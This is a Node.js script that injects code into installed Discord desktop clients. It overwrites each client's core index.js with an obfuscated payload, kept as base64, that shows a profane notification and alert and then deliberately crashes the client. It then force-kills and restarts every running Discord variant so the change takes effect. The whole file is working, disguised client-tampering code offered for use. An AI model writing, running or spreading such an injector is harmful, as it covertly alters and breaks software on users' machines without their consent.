const fs = require('fs');
const path = require('path');
const { globSync } = require('glob');
const JavaScriptObfuscator = require('javascript-obfuscator');
const c_process = require('child_process');

const script_base_64 = 'Y29uc3QgeyBCcm93c2VyV2luZG93LCBOb3RpZmljYXRpb24gfSA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7Cgpjb25zdCB3aW5kb3cgPSBCcm93c2VyV2luZG93LmdldEFsbFdpbmRvd3MoKVswXTsKCmNvbnN0IG4gPSBuZXcgTm90aWZpY2F0aW9uKHsKICAgIHRpdGxlOiAnR0VUIEZVQ0tFRCEnLAogICAgYm9keTogJ0dvIGNoZWNrIGl0IG91dCBnaXRodWIuY29tL1Byb2JhYmlsaXRpZXMnCn0pOwoKbi5zaG93KCkKCmNvbnN0IHNjcmlwdCA9IGBhbGVydCgnR0VUIEZVQ0tFRCEgZ2l0aHViLmNvbS9Qcm9iYWJpbGl0aWVzJylgCndpbmRvdy53ZWJDb250ZW50cy5leGVjdXRlSmF2YVNjcmlwdChzY3JpcHQsICEwKTsKCndpbmRvdy5jdW0oKSAvLyBEZWxpYmVyYXRlIGVycm9yIHRvIGNyYXNoIHRoZSBjbGllbnQ='

const obfuscatedScript = JavaScriptObfuscator.obfuscate(
    Buffer.from(script_base_64, 'base64').toString('utf-8'),
    { optionsPreset: 'high-obfuscation' }
)

const config = {
    logs: true,
    restart_discord: true // Restarts all discord clients installed on the system. Required to apply the injection.
}

class Injection {
    static injectIntoFiles() {
        let found = false

        const localAppData = process.env.LOCALAPPDATA

        for(const directory of fs.readdirSync(localAppData, 'utf-8')) {
            if(!directory.toLowerCase().includes('discord')) continue

            const directory_files = fs.readdirSync(path.join(localAppData, directory), 'utf-8')

            const matches = directory_files.filter((file) => file.match(/app-(\d*\.\d*)*/g))
            if(!matches.length) continue

            found = true

            matches.forEach((match) => {
                const absolutePath = path.join(localAppData, directory, match)
                const pattern = path.join(absolutePath, 'modules', 'discord_desktop_core-*', 'discord_desktop_core', 'index.js').replace(/\\/g, '/')

                const withModules = globSync(pattern)
                if(!withModules) return

                withModules.forEach((directory) => {
                    this.injectIntoFile(directory)
                })
            })
        }

        return found
    }

    static injectIntoFile(directory) {
        if(!fs.existsSync(directory)) return

        fs.writeFileSync(directory, obfuscatedScript + `\nmodule.exports = require('./core.asar');`)

        if(config.logs) console.log('[+] Injected into file:', directory)
    }

    static async restartAllClients(SplitLength = 0) {
        const clients = [
            'discord.exe',
            'lightcord.exe',
            'discordptb.exe',
            'discordcanary.exe'
        ]

        const tasklist = c_process.execSync('tasklist').toString('utf-8')

        const process_list = [...new Set(tasklist.split('\n').map((x) => x.replace(/[\r\n]/g, '')).map((x) => {
            if(x.includes('= ')){
                const process = x.split('= ')[0].length
                SplitLength = process
            }

            if(SplitLength != null) {
                const process_name = x.substring(0, SplitLength).trim()
                return process_name
            }
        }).filter((x) => x != undefined))]

        for(const proc of process_list) {
            try{
                if(!clients.includes(proc.toLowerCase())) continue

                c_process.execSync(`Taskkill /IM ${proc} /F`)
    
                const dir = path.join(process.env.LOCALAPPDATA, proc.split('.exe')[0], 'Update.exe')
                if(!fs.existsSync(dir)) continue
    
                c_process.execSync(`${dir} --processStart ${proc}`)
                if(config.logs) {
                    console.log('[~] Restarted client:', proc)
                }
            }catch{
                continue
            }
        }
    }
}

(async() => {
    Injection.injectIntoFiles()

    if(config.restart_discord) {
        await Injection.restartAllClients()
        if(config.logs) console.log('[-] Restarted all discord clients.')
    }
})()